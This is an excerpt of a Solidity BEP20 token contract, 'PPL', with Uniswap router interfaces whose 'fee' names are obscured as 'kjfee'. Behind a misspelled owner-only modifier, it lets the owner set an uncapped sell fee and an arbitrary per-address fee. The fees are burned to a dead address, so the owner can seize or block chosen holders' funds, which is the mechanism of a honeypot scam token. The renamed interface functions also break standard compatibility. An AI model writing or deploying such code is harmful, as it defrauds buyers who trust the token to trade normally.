...
interface IUniswapV2Factory {
    ...
    function kjfeeTo() external view returns (address);
    function kjfeeToSetter() external view returns (address);
    ...
    function setkjfeeTo(address) external;
    function setkjfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkjfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkjfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkjfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkjfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkjfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract PPL is BEP20, Ownable {
    ...
    uint256 private _defaultSellkjfee = 0;

    uint256 private _defaultBuykjfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkjfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkjfee = _value;
    }

    function setSlipkjfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkjfee[_address] = _value;
    }

    function getSlipkjfee(address _address) external view onlyownar returns (uint256) {
        return _slipkjfee[_address];
    }


    function setMAccountkjfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkjfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekjfeeAmount = 0;

        if (rF) {
            uint256 tradekjfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekjfee = _defaultSellkjfee;
                }
                if (from == uniswapV2Pair) {

                    tradekjfee = _defaultBuykjfee;
                }
            }
            if (_slipkjfee[from] > 0) {
                tradekjfee = _slipkjfee[from];
            }

            tradekjfeeAmount = _Amount.mul(tradekjfee).div(100);
        }


        if (tradekjfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekjfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekjfeeAmount);
            emit Transfer(from, _deadAddress, tradekjfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekjfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekjfeeAmount);
        emit Transfer(from, _to, _Amount - tradekjfeeAmount);
    }
